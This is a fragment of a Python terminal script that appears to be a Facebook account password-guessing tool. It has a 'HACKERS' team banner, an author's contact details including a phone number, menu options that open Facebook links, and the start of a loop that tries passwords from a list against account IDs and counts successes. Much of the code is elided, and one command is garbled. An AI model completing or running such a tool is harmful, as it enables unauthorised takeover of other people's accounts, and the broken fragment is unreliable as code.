...
\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\033[1;31m------------------------------------------------
\033[1;32m》AUTHOR    : Siam
》FACEBOOK  : md sam
》GITHUB    : 𝙏𝙀𝘽 𝙎𝙃𝘼𝙆𝙄𝘽 𝘾𝘼𝙔𝘽𝙀𝙍 𝙕𝙊𝙉𝙀 〄•ST⚝ℛ°️
》WHATSAPP  : 01956907221
》TAEM      : 𝙏𝙀𝘽 𝙎𝙃𝘼𝙆𝙄𝘽 𝘾𝘼𝙔𝘽𝙀𝙍 𝙕𝙊𝙉𝙀 〄•ST⚝ℛ°️HACKERS
\033[1;31m------------------------------------------------
"""
def linex():
	print('\033[1;37m----------------------------------------------')
...
def menu():
			...
			if xd in ['02','2']:
				awmafghan1()
			if xd in ['03','3']:
				os.system('xdg-opopenhttps://www.facebook.com/groups/260487543703551/?ref=share')
				print('\033[1;37m')
				print('\033[1;33m------------------------------------------------')
...
def awmafghan():
		...
		os.system('xdg-open https://www.facebook.com/profile.php?id=100000478721126')
		print('\033[1;33m------------------------------------------------')
		pcs = input(' [?] SELECT: ')
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [D.N 🦠❤️𝙉𝙄𝙇𝙊𝙔🌹𝘾𝙔𝘽𝙀𝙍❤️🦠 M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
